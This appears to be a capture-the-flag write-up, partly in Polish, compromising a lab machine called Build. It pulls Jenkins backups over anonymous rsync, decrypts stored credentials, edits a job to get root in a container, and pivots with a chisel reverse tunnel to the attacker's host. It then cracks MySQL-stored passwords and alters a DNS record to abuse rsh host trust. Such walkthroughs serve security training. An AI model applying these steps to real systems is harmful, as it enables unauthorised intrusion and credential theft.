# Build
Linux, Easy, created by **xct**

```
22/tcp   open     ssh             OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
53/udp    open   domain?
512/tcp open  exec    netkit-rsh rexecd
513/tcp open  login?
514/tcp open  shell   Netkit rshd
873/tcp open  rsync   (protocol version 31)
3000/tcp open     ppp?
3306/tcp filtered mysql
8081/tcp filtered blackice-icecap

```

I started with 873
https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync#banner-and-manual-communication

![list](https://github.com/user-attachments/assets/06b1e767-a09a-48e8-b2b3-d9b8830fac67)

![{06106B87-BFCC-48BE-B47C-50CA111F2CD7}](https://github.com/user-attachments/assets/dbb2fc91-8de1-4b8f-b2a6-228835b1fd92)

czekam około 3 minuty

```
rsync -av rsync://10.10.86.18/backups .
```

![{FD7E4963-9E4D-47F7-99E3-CC4E36E6DCAF}](https://github.com/user-attachments/assets/3d393b2a-97a3-4748-8a36-45b6998bcd2c)

![{4DD12C4F-DFAE-4594-B511-E88443B623E2}](https://github.com/user-attachments/assets/baefba4d-c1e3-44bb-996f-d6deb531d3c6)

under `jenkins_configuration/jobs/build/config.xml` we got hash
![jeniks1](https://github.com/user-attachments/assets/4ec50406-3ed2-4567-b2e6-24fb7e8a5ef6)

We also need `master.key` and `hudson.util.Secret`

I used [jenkins-credentials-decryptor](https://github.com/hoto/jenkins-credentials-decryptor) to decrypt the password.

![{79F79128-DBDA-481F-9E6D-4CAA2CD3915B}](https://github.com/user-attachments/assets/65ea9472-7a45-493e-bcc8-c942ef4ede37)

It works!

![{ECB87EC1-51C2-4489-9A03-4E5449BBF0B3}](https://github.com/user-attachments/assets/151feba0-4a68-4e87-b0bf-7a51504385d4)

Duży tych pliczków nie mamy, ale jak znam życie to to nawet prosty hook nie będzie tylko edycja tej komendy.

![{49386F7F-6E9D-484D-8F29-A3D7CA0CD154}](https://github.com/user-attachments/assets/402c23b3-d0aa-4bd4-9432-223d13f4ab6c)

![{8E79EAC7-D09B-48D1-A234-0429DBC7A19D}](https://github.com/user-attachments/assets/d2596929-9da4-4a8c-a34a-f4957f135805)

save and wait ~60-120sek

![{3AB9CB23-8DA5-4A78-8A8B-234B70B73E03}](https://github.com/user-attachments/assets/e157557e-91f7-479d-925d-0297a43c0670)

root na dockerze.

Pobieramy chisel'a

![{9F9C62C5-DE12-490B-9E02-DE00A997A6DD}](https://github.com/user-attachments/assets/6f8316c7-0ffe-4ced-b00d-3383db7f059b)

on docker
```
./chisel client 10.8.4.124:8000 R:socks
```
on my host
```
./chisel server --reverse --port 8000 --socks5
```

run port scan
```
proxychains4 -q nmap -Pn -v 172.18.0.1 172.18.0.2
```

![{D0AA01CD-F486-4054-80BA-8BFE075C334B}](https://github.com/user-attachments/assets/e13aa2e0-4605-498e-bb50-6bf5dc6a807b)


We are able to connect to mysql without password.

![{EADB8D67-8FDB-4F61-A4E7-2F9B3DAEEF08}](https://github.com/user-attachments/assets/436c78f6-cf9f-4aef-a613-dc472c7ae142)

![{3A32DD89-B0BA-4785-B2DB-789E63622A67}](https://github.com/user-attachments/assets/a721e35c-6696-471e-bc3a-b6a51d7bd1aa)

![{83C8F66A-64D2-4DE4-9F26-4A63214A7BEC}](https://github.com/user-attachments/assets/504efd07-ea2d-40fc-a9e1-080db55c0164)

I run cracking and found some interesting IPs

![{A167FC58-CA8B-4773-8B9F-2180B4D17FD4}](https://github.com/user-attachments/assets/89854343-fb7d-4532-a34c-e09f025d3ed5)


![{80D05ECC-88A6-4D5A-9DE5-2B0F8541EF54}](https://github.com/user-attachments/assets/cbdddb18-e3ac-42bb-8e19-44951f2e6eca)

In burp we turn on socks proxy

![{C26FE301-F89A-4C62-BCB8-E303F7DF474E}](https://github.com/user-attachments/assets/1bad48bd-5508-4c83-869a-f55b54940800)

![{5952F5F1-8076-4B57-8D37-AFAC0B86DCF6}](https://github.com/user-attachments/assets/ef70a2cc-2ca6-47ae-8700-2e22725a7ff9)

(ten drugi host jakieś hasło ma)

cracked password works here with username `admin`.

![{8E517551-BB0D-4241-9B07-BF7ED38E7E24}](https://github.com/user-attachments/assets/6cc7a55e-758e-4b44-b8c1-ed74e3986940)

Jak widzimy mamy tutaj dostęp do strefy "build.vl".

![{15248988-F773-4AB7-A054-6068962FED3E}](https://github.com/user-attachments/assets/816e2205-3a76-4db4-bed8-2d004b6a6498)

Z mysqla widzieliśmy kilka innych, ale też w /root z dokerze było coś ciekawego i screenka nie dałem

![{A7C91869-A792-4FDB-8D8E-95568E973BE6}](https://github.com/user-attachments/assets/daedf8b3-c43e-405c-923f-7fe5e664cdda)

To by znaczyło, że RSH client ufa zarówno subdomenkom `intern` jak i `admin`, ale tylko to `intern` jest skonfigurowana. Jedyne co musimy zrobić to zmienić adres IP na nasz

![{043BA9B6-EC13-4A22-8AD2-DF914D55C720}](https://github.com/user-attachments/assets/4beaff6d-888f-4316-91f5-0ea21ced1b45)

![{0096EE3C-B471-4AF5-A448-737FF9E8EDCF}](https://github.com/user-attachments/assets/3b118e0a-c546-4c5c-8817-373bbf944609)

![{23BCD616-91D3-44D2-A55F-664EC04333F1}](https://github.com/user-attachments/assets/db67a336-3996-442b-8e57-cf8e30305bc0)

FINISH
